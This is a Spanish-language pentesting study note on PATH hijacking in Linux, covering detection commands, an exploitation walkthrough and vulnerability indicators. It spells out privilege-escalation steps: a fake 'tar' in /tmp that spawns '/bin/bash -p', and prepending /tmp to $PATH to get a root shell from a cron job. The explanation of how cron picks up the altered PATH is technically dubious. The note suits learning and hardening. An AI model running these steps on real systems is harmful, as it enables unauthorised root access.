
---
Tags: #path #hijacking #privilegios

---

## 📌 Definición
El **PATH Hijacking** ocurre cuando un script o tarea (como un cron job) ejecuta un binario **sin especificar la ruta absoluta** (`tar` en lugar de `/bin/tar`).  
Si el atacante controla un directorio listado en la variable de entorno `$PATH`, puede colocar un binario falso que se ejecutará con los permisos del usuario (o root) que ejecute el script.

---

## 🔍 Detección
| Comando / Archivo | Descripción |
|-------------------|-------------|
| `echo $PATH` | Ver orden de directorios donde se buscan binarios. |
| `cat /etc/crontab` | Ver cron jobs globales. |
| `ls -la /etc/cron.*` | Ver tareas periódicas. |
| `grep -r "sh " /etc/cron*` | Buscar scripts ejecutados desde cron. |
| `strings /ruta/script.sh` | Revisar si se llaman binarios sin ruta absoluta. |

Ejemplo vulnerable dentro de un script:
```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/user/*
```

> Aquí `tar` no está especificado como `/bin/tar`.

---

## ⚡ Explotación

### 1. Identificar binario vulnerable

Supongamos que el script ejecuta:

`tar -czf /tmp/backup.tar.gz /home/user/*`

### 2. Crear binario falso

En un directorio con permisos de escritura (ej: `/tmp`):

`echo "/bin/bash -p" > /tmp/tar chmod +x /tmp/tar`

### 3. Alterar `$PATH`

Exportar la ruta para que `/tmp` tenga prioridad:

`export PATH=/tmp:$PATH`

### 4. Esperar ejecución del cron

Cuando el cron ejecute el script, en lugar del binario real, se ejecutará tu binario falso (`/tmp/tar`), obteniendo shell con permisos elevados.

---

## 📚 Ejemplo Práctico

1. **Cron vulnerable**:
    

`* * * * * root /usr/local/bin/backup.sh`

2. **Contenido de backup.sh**:
    

`#!/bin/bash tar -cf /tmp/backup.tar /home/kali/*`

3. **Explotación**:
    

`echo "/bin/bash -p" > /tmp/tar chmod +x /tmp/tar export PATH=/tmp:$PATH`

4. **Resultado**: Al ejecutarse el cron, se obtiene shell como root.
    

---

## 🚩 Indicadores de vulnerabilidad

- Scripts ejecutados por **root** que usan comandos sin ruta absoluta.
    
- `$PATH` incluye directorios **escribibles por usuarios sin privilegios** (ej: `/tmp`, `/home/user/bin`).
    
- Scripts sin sanitización del entorno antes de ejecutar binarios.
    

---

